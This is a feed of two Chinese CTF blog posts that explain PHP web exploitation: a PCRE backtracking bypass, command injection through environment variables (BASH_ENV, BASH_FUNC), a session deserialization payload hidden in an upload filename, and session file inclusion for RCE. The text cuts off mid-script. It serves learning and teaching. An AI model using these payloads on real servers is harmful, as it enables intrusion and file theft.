<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Err0r233</title>
  
  <subtitle>Err0r233的个人博客</subtitle>
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2023-03-12T09:43:56.843Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>Err0r2333</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>一道题学习两个知识点</title>
    <link href="http://example.com/2023/03/04/%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0%E4%B8%A4%E4%B8%AA%E7%9F%A5%E8%AF%86%E7%82%B9/"/>
    <id>http://example.com/2023/03/04/%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0%E4%B8%A4%E4%B8%AA%E7%9F%A5%E8%AF%86%E7%82%B9/</id>
    <published>2023-03-04T05:42:27.000Z</published>
    <updated>2023-03-12T09:43:56.843Z</updated>
    
    <content type="html"><![CDATA[<p>说点题外话，就是今年的安洵杯老逆天了这件事</p><p>其实我连账号都没有的（（ 懒狗本质，懒得去注册账号</p><p>然后看到群里发的比赛链接，欸，怎么连都进不去</p><p>容器环境也打不开… 还是得靠thai神</p><p>然后thai神光速做完web1下班，后面就没见到题目解了= =</p><p>额，这段话的意思就是很离谱，只能打开第一题的环境…</p><p>后面就更搞笑了</p><p>比赛直接给paused了，笑死</p><p>然后群里都在说这一届安洵杯就是个离谱杯</p><p>知乎一看：</p><p>Web： 5秒最多10次请求 开局500 公共环境静态flag</p><p>Misc：套题</p><p>Crypto： misc <s>简单的密码学不给附件</s></p><p>re：原题</p><p>甚至没有pwn</p><p><s>甚至还有开盒，收集学生信息</s></p><p>不过知乎说他们没少看p神文章还挺对的</p><p>web 1 就考的两篇p神的文章((</p><span id="more"></span><p>不吹水了，来看看web1</p><p>好像忘记源码了…</p><p>大概就是get传参名为<code>heizi</code>，开头前5个字符限制为<code>aikun</code> 最后10个字符限制为<code>xiaojijiao</code>，如果字符串为<code>aikunxiaojijiao</code>输出<code>nonono</code></p><p>否则进入下一层</p><p>下一层考的是p神的<code>PHP利用PCRE回溯次数限制绕过某些安全限制</code>这篇文章</p><p>源码应该是这样的：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/aikun.+?xiaojijiao/is&#x27;</span>,<span class="variable">$heizi</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hack!!!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;ls&#x27;</span>); <span class="comment">#好像是这样</span></span><br></pre></td></tr></table></figure><p>如果输入的是<code>aikunaaaaaxiaojijiao</code>的话</p><ul><li><code>.+?</code>匹配到<code>a</code></li><li>由于是非贪婪模式<code>.+?</code>停止匹配，由<code>s</code>匹配<code>a</code>（第二个a）</li><li>匹配失败，回溯到<code>.+?</code>匹配第2个a</li><li>然后停止，<code>s</code>匹配第三个<code>a</code></li><li>…</li></ul><p>随着a的数量增加，回溯次数越来越多，但是回溯次数的上限是100万次，如果超出了这个回溯次数就会返回false</p><p>所以我们直接用python打印100万个a写在里面就好了</p><p><code>print('a' * 1000000)</code></p><img src="/2023/03/04/%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0%E4%B8%A4%E4%B8%AA%E7%9F%A5%E8%AF%86%E7%82%B9/Payload1.png" class title="awa"><p>随后进入第二层</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_REQUEST</span>[<span class="string">&#x27;env&#x27;</span>] <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">blacklist</span>(<span class="variable">$value</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">putenv</span>(<span class="string">&quot;<span class="subst">&#123;$key&#125;</span>=<span class="subst">&#123;$value&#125;</span>&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hack!!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;echo doit&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ls|x|cat|tac|tail|nl|flag|more|less|head|od|vi|sort|rev|paste|file|grep|uniq|\?|\`|\~|\@|\-|\.|\[|\]|\&#x27;\&quot;|\\\\/is&#x27;</span>,<span class="variable">$a</span>)===<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#flag在/flag内</span></span><br></pre></td></tr></table></figure><p>这篇就是p神的</p><p><code>我是如何利用环境变量注入执行任意命令</code></p><p>其语句为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ENV=<span class="string">&#x27;$(id 1&gt;&amp;2)&#x27;</span> dash -i -c <span class="string">&#x27;echo hello&#x27;</span> <span class="comment">#dash</span></span><br><span class="line">BASH_ENV=<span class="string">&#x27;$(id 1&gt;&amp;2)&#x27;</span> bash -c <span class="string">&#x27;echo hello&#x27;</span> <span class="comment">#bash</span></span><br></pre></td></tr></table></figure><p>在CentOS 8下安装PHP，并使用本文开头的代码，直接运行一个测试服务器：</p><p>访问`1.php?envs[BASH_FUNC_echo%25%25]=()%20</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;说点题外话，就是今年的安洵杯老逆天了这件事&lt;/p&gt;
&lt;p&gt;其实我连账号都没有的（（ 懒狗本质，懒得去注册账号&lt;/p&gt;
&lt;p&gt;然后看到群里发的比赛链接，欸，怎么连都进不去&lt;/p&gt;
&lt;p&gt;容器环境也打不开… 还是得靠thai神&lt;/p&gt;
&lt;p&gt;然后thai神光速做完web1下班，后面就没见到题目解了= =&lt;/p&gt;
&lt;p&gt;额，这段话的意思就是很离谱，只能打开第一题的环境…&lt;/p&gt;
&lt;p&gt;后面就更搞笑了&lt;/p&gt;
&lt;p&gt;比赛直接给paused了，笑死&lt;/p&gt;
&lt;p&gt;然后群里都在说这一届安洵杯就是个离谱杯&lt;/p&gt;
&lt;p&gt;知乎一看：&lt;/p&gt;
&lt;p&gt;Web： 5秒最多10次请求 开局500 公共环境静态flag&lt;/p&gt;
&lt;p&gt;Misc：套题&lt;/p&gt;
&lt;p&gt;Crypto： misc &lt;s&gt;简单的密码学不给附件&lt;/s&gt;&lt;/p&gt;
&lt;p&gt;re：原题&lt;/p&gt;
&lt;p&gt;甚至没有pwn&lt;/p&gt;
&lt;p&gt;&lt;s&gt;甚至还有开盒，收集学生信息&lt;/s&gt;&lt;/p&gt;
&lt;p&gt;不过知乎说他们没少看p神文章还挺对的&lt;/p&gt;
&lt;p&gt;web 1 就考的两篇p神的文章((&lt;/p&gt;</summary>
    
    
    
    <category term="CTF Web" scheme="http://example.com/categories/CTF-Web/"/>
    
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>看看session.upload_progress</title>
    <link href="http://example.com/2023/03/04/%E7%9C%8B%E7%9C%8Bsession-upload-progress/"/>
    <id>http://example.com/2023/03/04/%E7%9C%8B%E7%9C%8Bsession-upload-progress/</id>
    <published>2023-03-04T05:12:51.000Z</published>
    <updated>2023-03-12T09:43:56.844Z</updated>
    
    <content type="html"><![CDATA[<p>这个东西让我印象挺深刻的（</p><p>最近一次接触还是在一道SQL注入的题目：</p><p><strong>[PwnThyBytes2019] BabySQL</strong></p><p>由于login.php没有session存在的时候就不能访问，并且无法注入</p><p>所以这时候就需要我们自己创造一个session</p><p>所以session_upload_progress在这里就派上用场了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">当session.upload_progress.enabled打开的时候（默认为On），我们传入PHP_SESSION_UPLOAD_PROGRESS的时候，php会执行session_start()，这个时候就会绕过没有session的限制</span><br></pre></td></tr></table></figure><p>然后我就想起来之前session反序列化的时候好像也是用这个session_upload_progress的</p><p>觉得这个东西挺有用的，就来学习一下</p><img src="/2023/03/04/%E7%9C%8B%E7%9C%8Bsession-upload-progress/1.png" class title="awa"><p><s>还有就是这个了（雾）</s></p><span id="more"></span><h1><span id="1绕过issetsession"> 1.绕过!isset[$session]</span></h1><p>就是上面的引子引入的题目，不多赘述</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>) AND <span class="keyword">die</span>(<span class="string">&quot;Direct access on this script is not allowed!&quot;</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;db.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&#x27;SELECT `username`,`password` FROM `ptbctf`.`ptbctf` where `username`=&quot;&#x27;</span> . <span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>] . <span class="string">&#x27;&quot; and password=&quot;&#x27;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]) . <span class="string">&#x27;&quot;;&#x27;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$con</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">auth</span>(<span class="params"><span class="variable">$user</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$user</span>;</span><br><span class="line">    <span class="keyword">return</span> True;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">(<span class="variable">$result</span>-&gt;num_rows &gt; <span class="number">0</span> AND <span class="variable">$row</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>() AND <span class="variable">$con</span>-&gt;<span class="title function_ invoke__">close</span>() AND <span class="title function_ invoke__">auth</span>(<span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>]) AND <span class="keyword">die</span>(<span class="string">&#x27;&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0; url=?p=home&quot; /&gt;&#x27;</span>)) <span class="title function_ invoke__">OR</span> (<span class="variable">$con</span>-&gt;<span class="title function_ invoke__">close</span>() AND <span class="keyword">die</span>(<span class="string">&#x27;Try again!&#x27;</span>));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    <span class="comment">#login.php</span></span><br></pre></td></tr></table></figure><h1><span id="2session反序列化"> 2.session反序列化</span></h1><p>session序列化/反序列化的默认引擎是php</p><p>但是如果php文件变成了：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_serialize&#x27;</span>);</span><br></pre></td></tr></table></figure><p>就将序列化的引擎改变了（php_serialize）</p><p>php引擎对于序列化的存储格式是：<code>|serialized_string</code>，而php_serialize引擎的存储格式是<code>serialized_string</code>，如果使用两个引擎分别处理的时候就会出现问题</p><p>这是因为<code>php_serialize</code>会将<code>|</code>当作正常字符来解析，生成session，<code>php</code>中会将<code>|</code>看作分隔符，解析session文件时会直接对<code>|</code>后的值进行反序列化处理（session_start()）</p><p>如果存在两种不同的引擎的时候，就可以利用session_start()的自动反序列化传输数据</p><p>此时当浏览器向服务器上传一个文件时，php将会把文件上传的详细信息存储在session当中；只需往该地址POST一个名为<code>PHP_SESSION_UPLOAD_PROGRESS</code>的字段，就可以将文件名的值赋值到session中，进行session反序列化</p><p>前提当然是<code>session.upload_progress.enabled为On</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">这个过程就是：</span><br><span class="line"></span><br><span class="line">由于处理引擎使用和默认引擎的不同导致竖线（|）后面的数据可以被反序列化</span><br><span class="line"></span><br><span class="line">使用php_serialize引擎生成的正常session(包含有序列化信息)在php引擎处会被session_start()自动序列化</span><br><span class="line"></span><br><span class="line">session.upload_progress.enabled打开的时候会将文件信息存储在session中，此时只需POST一个PHP_SESSION_UPLOAD_PROGRESS的字段，就可以将文件名的值赋值到session中，进行session反序列化</span><br></pre></td></tr></table></figure><p>简单看一个以前做的题就知道了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;source&#x27;</span>]))&#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Game</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$log</span>,<span class="variable">$name</span>,<span class="variable">$play</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;log = <span class="string">&#x27;/tmp/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$name</span>).<span class="string">&#x27;.log&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">play</span>(<span class="params"><span class="variable">$user_input</span>,<span class="variable">$bot_input</span></span>)</span>&#123;</span><br><span class="line">            <span class="variable">$output</span> = <span class="keyword">array</span>(<span class="string">&#x27;Rock&#x27;</span>=&gt;<span class="string">&#x27;&amp;#9996;&amp;#127995;&#x27;</span>,<span class="string">&#x27;Paper&#x27;</span>=&gt;<span class="string">&#x27;&amp;#9994;&amp;#127995;&#x27;</span>,<span class="string">&#x27;Scissors&#x27;</span>=&gt;<span class="string">&#x27;&amp;#9995;&amp;#127995;&#x27;</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;play = <span class="variable">$user_input</span>.<span class="variable">$bot_input</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;play == <span class="string">&quot;RockRock&quot;</span> || <span class="variable language_">$this</span>-&gt;play == <span class="string">&quot;PaperPaper&quot;</span> || <span class="variable language_">$this</span>-&gt;play == <span class="string">&quot;ScissorsScissors&quot;</span>)&#123;</span><br><span class="line">                <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;log,<span class="string">&quot;&lt;div&gt;&quot;</span>.<span class="variable">$output</span>[<span class="variable">$user_input</span>].<span class="string">&#x27; VS &#x27;</span>.<span class="variable">$output</span>[<span class="variable">$bot_input</span>].<span class="string">&quot; Draw&lt;/div&gt;\n&quot;</span>,FILE_APPEND);</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Draw&quot;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;play == <span class="string">&quot;RockPaper&quot;</span> || <span class="variable language_">$this</span>-&gt;play == <span class="string">&quot;PaperScissors&quot;</span> || <span class="variable language_">$this</span>-&gt;play == <span class="string">&quot;ScissorsRock&quot;</span>)&#123;</span><br><span class="line">                <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;log,<span class="string">&quot;&lt;div&gt;&quot;</span>.<span class="variable">$output</span>[<span class="variable">$user_input</span>].<span class="string">&#x27; VS &#x27;</span>.<span class="variable">$output</span>[<span class="variable">$bot_input</span>].<span class="string">&quot; You Lose&lt;/div&gt;\n&quot;</span>,FILE_APPEND);</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;You Lose&quot;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;play == <span class="string">&quot;RockScissors&quot;</span> || <span class="variable language_">$this</span>-&gt;play == <span class="string">&quot;PaperRock&quot;</span> || <span class="variable language_">$this</span>-&gt;play == <span class="string">&quot;ScissorsPaper&quot;</span>)&#123;</span><br><span class="line">                <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;log,<span class="string">&quot;&lt;div&gt;&quot;</span>.<span class="variable">$output</span>[<span class="variable">$user_input</span>].<span class="string">&#x27; VS &#x27;</span>.<span class="variable">$output</span>[<span class="variable">$bot_input</span>].<span class="string">&quot; You Win&lt;/div&gt;\n&quot;</span>,FILE_APPEND);</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;You Win&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;h5&gt;Game History&lt;/h5&gt;\n&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;div class=&#x27;all_output&#x27;&gt;\n&quot;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;log);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;/div&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">session_start</span>();</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>]=<span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;win&#x27;</span>]=<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>]))&#123;</span><br><span class="line">        <span class="meta">?&gt;</span></span><br><span class="line">        &lt;body&gt;</span><br><span class="line">            &lt;h5&gt;Input your name :&lt;/h5&gt;</span><br><span class="line">            &lt;form method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">            &lt;input type=<span class="string">&quot;text&quot;</span> <span class="class"><span class="keyword">class</span>=&quot;<span class="title">result</span>&quot; <span class="title">name</span>=&quot;<span class="title">name</span>&quot;&gt;&lt;/<span class="title">input</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">button</span> <span class="title">type</span>=&quot;<span class="title">submit</span>&quot;&gt;<span class="title">submit</span>&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">html</span>&gt;</span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span> <span class="title">exit</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">?&gt;</span></span><br></pre></td></tr></table></figure><p>（ctfshow新手杯-石头剪刀布）</p><p>源码可以看到<code>__destruct()</code>魔术方法里<code>file_get_contents()</code>这一个危险的函数</p><p>可以想到用反序列化获取flag</p><p>虽然整个源码没有unserialize()函数，但是源码开头将序列化反序列化引擎设置为了<code>php</code>，通过phpinfo()可以看到默认处理器是<code>php_serialize</code>，且<code>session.upload_progress.enabled</code>已经打开</p><p>所以这里就可以通过尝试上传session进行反序列化</p><p>先进行反序列化，这个反序列化连我都能看得懂(</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Game</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span>  <span class="variable">$log</span>=<span class="string">&quot;/var/www/html/flag.php&quot;</span>; <span class="comment">//需要完整路径</span></span><br><span class="line">        <span class="keyword">public</span>        <span class="variable">$name</span>=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">public</span>        <span class="variable">$play</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Game</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#output O:4:&quot;Game&quot;:3:&#123;s:3:&quot;log&quot;;s:22:&quot;/var/www/html/flag.php&quot;;s:4:&quot;name&quot;;i:1;s:4:&quot;play&quot;;s:0:&quot;&quot;;&#125;</span></span><br><span class="line"><span class="comment">//然后记得在每个双引号前添加反斜杠(\)防止转义，在前面添加竖线即可</span></span><br><span class="line">|O:<span class="number">4</span>:\<span class="string">&quot;Game\&quot;:3:&#123;s:3:\&quot;log\&quot;;s:22:\&quot;/var/www/html/flag.php\&quot;;s:4:\&quot;name\&quot;;i:1;s:4:\&quot;play\&quot;;s:0:\&quot;\&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p>然后post传个文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryg3k5hVdW6mTNQVxP</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">------WebKitFormBoundaryg3k5hVdW6mTNQVxP</span><br><span class="line">Content-Disposition: form-data; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br><span class="line"></span><br><span class="line">aaaaaa</span><br><span class="line">------WebKitFormBoundaryg3k5hVdW6mTNQVxP</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;|O:4:\&quot;Game\&quot;:1:&#123;s:3:\&quot;log\&quot;;s:22:\&quot;/var/www/html/flag.php\&quot;;&#125;&quot;</span><br><span class="line">Content-Type: text/plain</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryg3k5hVdW6mTNQVxP--</span><br></pre></td></tr></table></figure><p>发包过去就好了</p><h1><span id="3文件包含"> 3.文件包含</span></h1><p>1.如果<code>session.auto_start=On</code>的话，即使没有<code>session_start()</code>也会对session进行初始化，但是默认关闭</p><p>由于<code>session.use_strict_mode</code>默认值为0，导致用户可以自定义Session ID（Cookie: PHPSESSID= xxx）</p><p>这个时候PHP就会在服务器上创建一个文件<code>/tmp/sess_xxx</code></p><p>这个时候PHP会自动初始化session，并且将文件名等内容写入<code>sess_xxx</code>文件中</p><p>其实就是这个：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">upload_progress_NSSCTF&#123;c6c326ee-fda7-4078-a6c0-c1feeca911b2&#125;</span><br><span class="line">|a:5:&#123;s:10:&quot;start_time&quot;;i:1677673236;s:14:&quot;content_length&quot;;i:277;s:15:&quot;bytes_processed&quot;;i:277;s:4:&quot;done&quot;;b:0;s:5:&quot;files&quot;;a:1:&#123;i:0;a:7:&#123;s:10:&quot;field_name&quot;;s:4:&quot;file&quot;;s:4:&quot;name&quot;;s:9:&quot;Err0r.txt&quot;;s:8:&quot;tmp_name&quot;;N;s:5:&quot;error&quot;;i:0;s:4:&quot;done&quot;;b:0;s:10:&quot;start_time&quot;;i:1677673236;s:15:&quot;bytes_processed&quot;;i:0;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p><code>upload_progress_xxx</code> 这个xxx其实就是命令执行之后的结果</p><p>然后序列化的结果就是文件的一些详细信息，包括文件名，上传时间等</p><p>也就是说如果我们此时包含了这个文件，这个文件写入了<code>eval()</code>的话就可以进行rce</p><p>但是由于<code>session.upload_progress.cleanup = on</code>使得上传的<code>sess_xx</code>会被立即清空，此时在session文件内容清空前包含即可</p><p>script:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 